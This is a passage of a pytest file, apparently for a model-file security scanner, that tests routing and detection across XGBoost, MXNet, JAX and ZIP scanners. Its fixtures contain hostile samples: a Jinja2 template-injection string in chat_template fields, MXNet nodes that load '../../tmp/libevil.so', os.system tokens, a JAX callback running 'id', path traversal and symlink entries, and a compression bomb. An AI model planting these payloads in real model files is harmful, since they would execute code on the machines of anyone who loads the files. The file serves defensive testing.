        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_polyglot_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["xgboost", "mxnet", "manifest"], "cache_enabled": False},
    )

    assert result.scanner_name == "xgboost"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_zip_scan_preserves_skipped_scanner_ids_from_multiple_members(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "overlap.json",
            '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
            '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        )
        archive.writestr(
            "config.json",
            '{"chat_template":"{{ user }}","nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        )

    result = ZipScanner({"scanners": ["zip", "mxnet", "manifest"], "cache_enabled": False}).scan(str(archive_path))

    assert set(result.metadata["skipped_scanner_ids"]) >= {"xgboost", "jinja2_template"}
    selection_ids = {
        check.details.get("skipped_scanner_id") for check in result.checks if check.name == "Scanner Selection"
    }
    assert selection_ids >= {"xgboost", "jinja2_template"}


def test_scan_nested_file_xgboost_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_config_preserves_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_tokenizer_config_preserves_direct_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    extracted_member = tmp_path / "tokenizer_config.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    extracted_member = tmp_path / "generation_config.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["jinja2_template"], "cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_malformed_generation_config_runs_jinja_after_manifest_parse_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    extracted_member = tmp_path / "generation_config.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"arg_nodes":[0],'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","padding":"' + ("x" * 300),
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["manifest", "jinja2_template"], "cache_enabled": False},
    )

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_mxnet_shaped_tokenizer_config_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "tokenizer_config.json"
    extracted_member.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_mxnet_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["mxnet", "manifest"], "cache_enabled": False},
    )

    assert result.scanner_name == "mxnet"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_nested_file_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(tmp_path: Path) -> None:
    extracted_member = tmp_path / "generation_config.json"
    extracted_member.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["mxnet", "jinja2_template"], "cache_enabled": False},
    )

    assert result.scanner_name == "mxnet"
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_mxnet_routed_tokenizer_duplicate_override_preserves_direct_jinja_analysis(
    tmp_path: Path,
) -> None:
    extracted_member = tmp_path / "tokenizer_config.json"
    extracted_member.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["mxnet", "jinja2_template"], "cache_enabled": False},
    )

    assert result.scanner_name == "mxnet"
    assert "mxnet_symbol_invalid_structure" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "chat_template.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_malformed_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    extracted_member = tmp_path / "chat_template.json"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",',
        encoding="utf-8",
    )

    result = scan_nested_file(
        str(extracted_member),
        {"scanners": ["xgboost", "jinja2_template"], "cache_enabled": False},
    )

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_nested_file_keeps_oversized_renamed_overlap_on_bounded_mxnet_route(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr("modelaudit.scanners.mxnet_scanner.MAX_SYMBOL_READ_BYTES", 512)
    extracted_member = tmp_path / "payload.meta"
    extracted_member.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "JSON Parsing" for check in result.checks)


@pytest.mark.parametrize("version", ["[1,7,4]", '"malformed"'])
def test_scan_nested_file_xgboost_only_oversized_renamed_overlap_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    version: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    extracted_member = tmp_path / "payload.meta"
    extracted_member.write_text(
        '{"version":' + version + ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "File Size Limit" for check in result.checks)


def test_scan_nested_file_symbol_routed_params_preserves_raw_text_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr("modelaudit.scanners.mxnet_scanner.MAX_SYMBOL_READ_BYTES", 512)
    extracted_member = tmp_path / "payload-0000.params"
    extracted_member.write_text(
        '{"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        '"version":[1,7,4],"learner":{"malicious_code":"os.system()"},"padding":"' + ("x" * 1024) + '"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("filename", ["payload.dat", "payload.meta"])
def test_scan_nested_file_fails_closed_when_mxnet_structure_is_beyond_bounded_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / filename
    extracted_member.write_text(
        (" " * 129) + '{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
    check = next(check for check in result.checks if check.name == "MXNet Symbol Routing")
    assert "bounded JSON probe reached its limit" in check.message


def test_scan_nested_file_inconclusive_mxnet_route_composes_jax_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "ambiguous-jax.dat"
    extracted_member.write_text(
        '{"framework":"jax","nodes":[{"attrs":"'
        + ("x" * 129)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        '"payload":"jax.experimental.host_callback.call(os.system, \'id\')"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_route_composes_escaped_suffix_owned_jax_payload_without_root_marker(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "ambiguous-jax.checkpoint"
    extracted_member.write_text(
        json.dumps(
            {
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.io_callback",
            }
        ).replace("jax.experimental.io_callback", r"j\u0061x.experimental.io_callback"),
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_nested_file_inconclusive_mxnet_route_does_not_compose_ambiguous_large_foreign_json(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "ambiguous-large-foreign.dat"
    extracted_member.write_text(
        json.dumps(
            {
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "padding": "x" * (file_detection.JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == ["mxnet_symbol_routing_incomplete"]
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_nested_file_inconclusive_mxnet_route_preserves_jax_incomplete_reason(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    nested_payload: dict[str, Any] = {"value": "safe"}
    for _ in range(2 * JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH):
        nested_payload = {"nested": nested_payload}
    extracted_member = tmp_path / "ambiguous-deep-jax.dat"
    extracted_member.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": nested_payload,
            }
        ),
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == [
        "jax_metadata_traversal_depth_limit",
        "mxnet_symbol_routing_incomplete",
    ]
    assert any(check.name == "JSON Metadata Traversal Depth Limit" for check in result.checks)


def test_scan_nested_file_fails_closed_when_mxnet_prefix_exceeds_nesting_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "deep-prefix.dat"
    extracted_member.write_text(
        '{"metadata":'
        + ("[" * 65)
        + "0"
        + ("]" * 65)
        + ',"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
        + ("x" * 129)
        + '"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_small_renamed_mxnet_value_budget_before_structure_fails_closed(tmp_path: Path) -> None:
    extracted_member = tmp_path / "padded.jpg"
    extracted_member.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert extracted_member.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_inconclusive_params_routing_preserves_raw_findings(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload-0000.params"
    extracted_member.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert any("Suspicious executable token" in issue.message for issue in result.issues)


def test_scan_nested_file_inconclusive_params_routing_honors_excluded_mxnet(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload-0000.params"
    extracted_member.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})

    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert not any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("context") == "inconclusive MXNet params byte analysis"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_nested_file_generic_json_value_budget_before_mxnet_structure_detects_library(tmp_path: Path) -> None:
    extracted_member = tmp_path / "model.json"
    extracted_member.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert extracted_member.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_nested_file_fails_closed_for_post_budget_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"nodes":[],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_generic_json_hint_before_value_budget_resolves_later_mxnet_structure(tmp_path: Path) -> None:
    extracted_member = tmp_path / "model.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_nested_file_generic_array_heads_before_value_budget_without_mxnet_structure_uses_existing_owner(
    tmp_path: Path,
) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"heads":["classification"],"padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_nested_file_scalar_heads_generic_json_uses_existing_owner(tmp_path: Path) -> None:
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"heads":"main","padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_nested_file_generic_json_with_padded_node_object_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "metadata.json"
    extracted_member.write_text(
        '{"nodes":[{"attrs":"'
        + ("x" * 129)
        + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


@pytest.mark.parametrize("initial_nodes", ["[]", "null"])
def test_scan_nested_file_early_duplicate_mxnet_nodes_without_other_hints_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    initial_nodes: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "metadata.json"
    extracted_member.write_text(
        '{"nodes":'
        + initial_nodes
        + ',"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_oversized_generic_json_with_lone_array_heads_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"heads":["classification"],"padding":"' + ("x" * 256) + '"}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_oversized_generic_json_with_mxnet_heads_shape_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"heads":[[0,0,0]],"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_scan_nested_file_oversized_generic_json_with_hidden_mxnet_graph_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    extracted_member = tmp_path / "config.json"
    extracted_member.write_text(
        '{"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"


def test_zip_scanner_marks_configured_skipped_archive_entries_incomplete(tmp_path: Path) -> None:
    archive_path = tmp_path / "skip-metadata.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("metadata.json", '{"metadata":"' + ("x" * ((10 * 1024 * 1024) + 1)) + '"}')

    result = ZipScanner({"skip_archive_entries": ["metadata.json"], "cache_enabled": False}).scan(str(archive_path))

    assert result.success is False
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "ZIP Member Analysis Coverage"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "metadata.json"
        for check in result.checks
    )
    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)


def test_zip_scanner_preserves_executable_name_finding_for_skipped_archive_entry(tmp_path: Path) -> None:
    archive_path = tmp_path / "skipped-executable.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("bin/run.sh", "#!/bin/sh\necho hidden\n")

    result = ZipScanner({"skip_archive_entries": ["bin/run.sh"], "cache_enabled": False}).scan(str(archive_path))

    assert result.success is False
    assert any(
        check.name == "Executable Archive Member Detection"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "bin/run.sh"
        for check in result.checks
    )


def test_zip_scanner_checks_compression_ratio_before_skipping_archive_entry(tmp_path: Path) -> None:
    archive_path = tmp_path / "skipped-bomb.zip"
    with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("model.weights.h5", b"0" * (ZipScanner.MIN_COMPRESSION_BOMB_UNCOMPRESSED_SIZE + 1))

    result = ZipScanner({"skip_archive_entries": ["model.weights.h5"], "cache_enabled": False}).scan(str(archive_path))

    assert any(
        check.name == "Compression Ratio Check"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "model.weights.h5"
        and check.rule_code == "S410"
        for check in result.checks
    )


def test_zip_scanner_validates_traversal_before_skipping_archive_entry(tmp_path: Path) -> None:
    archive_path = tmp_path / "skipped-traversal.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("../metadata.json", '{"keras_version": "3.0.0"}')

    result = ZipScanner({"skip_archive_entries": ["../metadata.json"], "cache_enabled": False}).scan(str(archive_path))

    assert any(
        check.name == "Path Traversal Protection"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "../metadata.json"
        for check in result.checks
    )


def test_zip_scanner_validates_readable_symlink_target_before_regular_skip(tmp_path: Path) -> None:
    archive_path = tmp_path / "skipped-symlink.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        info = zipfile.ZipInfo("weights_link")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, "../outside.bin")

